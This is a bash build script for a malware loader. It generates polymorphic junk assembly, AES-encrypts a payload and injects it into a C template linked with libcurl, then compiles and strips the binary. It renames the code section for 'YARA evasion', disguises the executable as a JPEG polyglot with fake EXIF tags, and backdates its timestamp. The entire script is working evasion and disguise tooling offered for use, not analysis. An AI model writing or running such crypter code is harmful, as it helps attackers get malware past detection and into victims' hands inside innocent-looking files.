#!/bin/bash
set -e

if [ $# -lt 4 ]; then
    echo "Usage: $0 <image.jpg> <payload.bin> <base_key> <iv>"
    exit 1
fi

IMG="$1"
PAYLOAD="$2"
BASE_KEY="$3"
IV="$4"

# Generate polymorphic junk.h
echo "[*] Generating junk.h..."
cat << 'EOF' > generate_junk.sh
#!/bin/bash
instructions=("nop" "xchg %eax, %eax" "mov %rbx, %rbx" "lea (%rsp), %rsp")
count=$((RANDOM % 5 + 1))
asm=""
for ((i=0; i<count; i++)); do
    idx=$((RANDOM % ${#instructions[@]}))
    asm+="${instructions[idx]}; "
done
echo "#define JUNK_ASM __asm__ __volatile__ (\"$asm\")" > junk.h
EOF
chmod +x generate_junk.sh
./generate_junk.sh

# Encrypt payload
echo "[*] Encrypting payload with AES-256-CBC..."
openssl enc -aes-256-cbc -in "$PAYLOAD" -out payload.enc -K "$BASE_KEY" -iv "$IV" -nopad 2>/dev/null

# Convert to C byte arrays
ENC_PAYLOAD=$(xxd -p payload.enc | tr -d '\n' | sed 's/../\\x&/g')
IV_HEX=$(echo -n "$IV" | xxd -p | tr -d '\n' | sed 's/../\\x&/g')
BASE_KEY_HEX=$(echo -n "$BASE_KEY" | xxd -p | tr -d '\n' | sed 's/../\\x&/g')

# Inject into quantumserver.c
echo "[*] Generating quantumserver.c..."
sed "s|__ENCRYPTED_PAYLOAD__|$ENC_PAYLOAD|" quantumserver.c \
    | sed "s|__IV__|$IV_HEX|" \
    | sed "s|__BASE_KEY__|$BASE_KEY_HEX|" > quantumserver_temp.c

# Compile
echo "[*] Compiling quantum payload..."
gcc -o quantum_server quantumserver_temp.c -lcrypto -lcurl -O3 -fvisibility=hidden -Wno-nonnull
strip --strip-all quantum_server

# YARA evasion: Rename sections
RANDOM_TEXT=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 8)
objcopy --rename-section .text=$RANDOM_TEXT quantum_server

# Create JPEG polyglot
echo "[*] Creating JPEG polyglot..."
echo -ne '\xff\xd8\xff\xe0' > "$IMG"
dd if=quantum_server bs=1 >> "$IMG" 2>/dev/null
exiftool -overwrite_original -Model="QuantumLoader" -Artist="InvisibleThread" "$IMG" > /dev/null 2>&1
chmod +x "$IMG"
touch -t 200109110666 "$IMG"

echo "[✓] Built: $IMG"
rm -f quantum_server quantumserver_temp.c payload.enc junk.h generate_junk.sh
